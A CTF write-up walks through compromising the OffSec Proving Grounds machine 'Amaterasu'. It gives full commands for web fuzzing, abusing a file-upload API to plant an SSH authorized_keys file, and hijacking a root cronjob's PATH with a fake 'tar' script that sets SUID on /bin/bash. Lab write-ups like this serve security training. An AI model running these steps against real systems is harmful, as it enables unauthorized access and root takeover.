---
title: "Amaterasu"
date: 2024-10-10
draft: false
summary: "Writeup for Amaterasu proving grounds CTF challenge."
tags: ["linux", "cron", "file upload", "api"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/amaterasu/4.webp"
  caption: "Amaterasu Proving Grounds Challenge"
  alt: "Amaterasu cover"
platform: "Misc"
---

**Amaterasu** is an CTF challenge on Offsec's proving grounds and requires us to find 2 flags by exploiting different vulnerabilities.
<!--more-->
To access the lab, click on the link given below:
- https://portal.offsec.com/labs/play

## Reconnaissance

I performed an **nmap** scan to find information about the target.

```shell
nmap -A -p- TARGET -oN amaterasu.nmap --min-rate 10000
```

| **PORT** | **SERVICE** |
| -------- | ----------- |
| 21       | FTP         |
| 25022    | SSH         |
| 33414    | HTTP        |
| 40080    | HTTP        |

![](https://cdn.ziomsec.com/amaterasu/1.webp)
![](https://cdn.ziomsec.com/amaterasu/2.webp)
![](https://cdn.ziomsec.com/amaterasu/3.webp)

## Initial Foothold

Since **nmap** identified anonymous login on **FTP**, I accessed the server. However, it contained nothing so I moved onto the next service i.e http.

```shell
ftp TARGET
# username: anonymous
# password: anonymous
```

![](https://cdn.ziomsec.com/amaterasu/4.webp)

The page didn't contain anything interesting so I used **ffuf** to bruteforce hidden directories.

```shell
ffuf -u http://TARGET:40080/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -mc 200,302,301
```

![](https://cdn.ziomsec.com/amaterasu/5.webp)

Since this did not reveal anything of interest, I shifted to the next port running HTTP service and again performed a directory brute force using **ffuf**.

```shell
ffuf -u http://TARGET:33414/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

![](https://cdn.ziomsec.com/amaterasu/6.webp)

I accessed the discovered paths and found endpoints to perform various operations.

![](https://cdn.ziomsec.com/amaterasu/7.webp)

![](https://cdn.ziomsec.com/amaterasu/8.webp)

The `file-list?dir=/tmp` endpoint allowed me to view the contents of the **`/tmp`** directory.

![](https://cdn.ziomsec.com/amaterasu/9.webp)

The `/file-upload` endpoint allowed me to upload files. So I created a file and tried uploading using **curl**.

```shell
curl -H 'Content-Type: multipart/form-data' -F file='@//root/offsec/amaterasu/scriptie.txt' -F filename='/tmp/scriptie.txt' http://TARGET:33414/file-upload
```

![](https://cdn.ziomsec.com/amaterasu/10.webp)
![](https://cdn.ziomsec.com/amaterasu/11.webp)

I navigated to the `file-list` endpoint and found my uploaded file.

![](https://cdn.ziomsec.com/amaterasu/12.webp)

Since the `/file-list` endpoint used the parameter `dir` to select a folder to view, I used it to view the contents inside `/home` directory.

![](https://cdn.ziomsec.com/amaterasu/13.webp)

![](https://cdn.ziomsec.com/amaterasu/14.webp)

Inside **Alfred's** home directory, I found the **.ssh** folder so I looked into it. I also found the first flag here.

![](https://cdn.ziomsec.com/amaterasu/15.webp)

The **.ssh** file contained **alfred's** public and private key. I could upload my public key to this folder and save them as **authorized_keys**. This would allow me to log in using my private key.

```shell
$ ssh-keygen
$ cd .ssh; chmod 600 id_rsa
```

![](https://cdn.ziomsec.com/amaterasu/16.webp)

> Since the **api** only allowed certain file extensions, I renamed my file to `id_rsa.txt`

```shell
cp id_rsa.pub id_rsa.txt
```

![](https://cdn.ziomsec.com/amaterasu/17.webp)

Finally I uploaded the file and saved them as *authorized_keys*

```shell
curl -H 'Content-Type: multipart/form-data' -F file='@//root/offsec/amaterasu/.ssh/id_rsa.txt' -F filename='/home/alfredo/.ssh/authorized_keys' http://TARGET:33414/file-upload
```

![](https://cdn.ziomsec.com/amaterasu/18.webp)

![](https://cdn.ziomsec.com/amaterasu/19.webp)

I then logged in using my private key on the using **ssh** service that was running on port **25022**

```shell
ssh alfred@TARGET -p 25022 -i /root/offsec/amaterasu/.ssh/id_rsa
```

![](https://cdn.ziomsec.com/amaterasu/20.webp)

Upon logging in, I captured the first flag from the home directory.

![](https://cdn.ziomsec.com/amaterasu/21.webp)

## Privilege Escalation

I used **linpeas** to enumerate privesc vectors.
- https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

![](https://cdn.ziomsec.com/amaterasu/22.webp)

Using it, I was able to discover a cronjob that executed a bash script every minute.

```shell
cat /etc/crontab
```

![](https://cdn.ziomsec.com/amaterasu/23.webp)

I viewed the script that it was running. This script added `/home/alfredo/restapi` to the `PATH` environment variable and then move into the directory to create a compressed archive of all files in the directory. This archive was then saved in the `/tmp` directory.

![](https://cdn.ziomsec.com/amaterasu/24.webp)

I viewed the **`/restapi`** folder and found 2 python files and a folder to store compiled python files. I created a bash script that added an **suid** bit to **/bin/bash** binrary. I added execution permission to this file using **chmod** and copied it inside the **`/restapi`** folder.

```shell
$ echo '#!/bin/bash' > tar
$ echo 'chmod u+s /bin/bash' >> tar
$ cp tar restapi/
$ cd restapi/
$ chmod +x tar
$ cat tar
```

![](https://cdn.ziomsec.com/amaterasu/25.webp)

After a minute I verified if my script was executed and found the **suid** bit on the **`bash`** binary.

```shell
find / -user root -perm -u=s -ls 2>/dev/null
```

![](https://cdn.ziomsec.com/amaterasu/26.webp)

Finally I executed **bash** in privileged mode and captured the final flag from the `/root` directory.

```shell
bash -p
```

![](https://cdn.ziomsec.com/amaterasu/27.webp)

## Closure

Here's a summary of how I pwnd **Amaterasu**:
- I fuzzed web directories to find a directory with api endpoints that allowed my to upload files and view contents of directories.
- I uploaded my **public key** as **authorized_keys** in the **.ssh** file and logged in using my **private** key.
- I captured the first flag from **alfred's** home directory.
- I ran **linpeas** to discover a **cronjob** that ran every minute.
- I added an executable bash script that added an **suid** bit to the **`/bin/bash`** binary and waited for the cron to execute my script.
- I then executed **bash** in privileged mode and captured the final flag from the `/root` directory.

That's it from my side! 
Happy hacking 🎉

---
